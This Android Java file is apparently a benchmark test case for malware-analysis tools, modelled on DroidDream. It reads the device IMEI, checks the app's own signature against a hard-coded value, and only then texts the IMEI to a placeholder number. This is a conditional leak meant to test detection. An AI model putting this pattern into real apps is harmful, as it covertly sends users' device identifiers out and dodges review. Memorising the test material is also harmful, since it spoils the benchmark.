
package de.ecspride;

import java.util.Date;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.Signature;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * @testcase_name TimeBomb: triggers the payload on the DroidDream fashion
 * Inspired by Fig1.a in AppContext: Differentiating Malicious and Benign 
 * Mobile App Behaviors Using Context (Wei Yang, et al. 2015)
 * 
 * To be tested with DroidDream family.
 */
public class SignatureVerification extends Activity {
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.signverification);
		
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
		SmsManager sms = SmsManager.getDefault();		
		
		Context context = getApplicationContext();
		String sig="";
		try {
			sig = context.getPackageManager().getPackageInfo(context.getPackageName(),PackageManager.GET_SIGNATURES).signatures[0].toCharsString();
		} catch (NameNotFoundException e) {}    
		Log.d("IBM", "Signature: " + sig);

		if (checkSig(sig)){
		Log.d("IBM", "sending SMS: "+imei);
        sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink		
		} else {
			Log.d("IBM", "I'm a well behaved app");
		}
        Log.d("IBM", "end");
    }

	private boolean checkSig(String sig) {
		return sig.equals("3082034f30820237a00302010202047a19bf0f300d06092a864886f70d01010b05003057310b3009060355040613025553310d300b0603550408130461736664310d300b0603550407130461647366310d300b060355040a130461736466310c300a060355040b1303616466310d300b06035504031304617364663020170d3135303630323136323135385a180f32313134303530393136323135385a3057310b3009060355040613025553310d300b0603550408130461736664310d300b0603550407130461647366310d300b060355040a130461736466310c300a060355040b1303616466310d300b060355040313046173646630820122300d06092a864886f70d01010105000382010f003082010a02820101009e7e7d7ab283e1b5f312d5ff3a527560197b0e5f609951945252b0871c9d1ff6c42d928307cd1ee5d49aaa19d79e2a93f6db8fb87708a8620c3e83dc105ae1de5c8dc0a2b12fba123b6d7b1ef151f0cd6f9be12c6e84178ca2a9dc2976d58b2dbe781d9a0cc50cced0c123e187442112cf46f88a4387f64435cc7f847cc9d42ed1e3c52926bd5b6bca6ff4a325f9f509d2063110f88be8a40f0be2dae2b28297c8b86f4344d3f396490d8922585a7b0e7ba2c1b539c0fe8b45454bf0113f7422555a5162b68465d8f8efc707076560fcf9d7c0d491636e32ae63bcf8d70385f8d81d761950a1006d39d439fa65ca1802b0a624bd27055cd6381bb25cf2d600db0203010001a321301f301d0603551d0e041604144d26ac6de7b26480db1fe18874783526a423933f300d06092a864886f70d01010b050003820101003f6476ba98524b3433cc87a6f1716d7121dfbf11c96bce0aa87237a4c490b9e88cb3fa88e16d8cbbb13ff53ca56c36a761053fd9cd5a62f8d6bbf7cba450c644f06717b737e29225c932b4b22e6dfa41c17a8dcfed29d9187f7f2139f42ff5cb65c4b0056d5bc8796d64932beb9a883b739fbcf6957000f065092434e63fffa699ce7f02ef78c1e56bf59df784944a22412222051e9d50ca407c96a60bcd415330824a1ee59bc1f66ee438e5d4e0b5af5a7a58f54fe9224578a5b1a2abd11a63bfd723cda4e83461b7660e8a1a781ca3020382bd248cae1e327cadafdb75d3a81bbae83a11aa4afb6e652efd818c58b0613e4992421221fe6067e3a7c45a6cb9");
	}
}
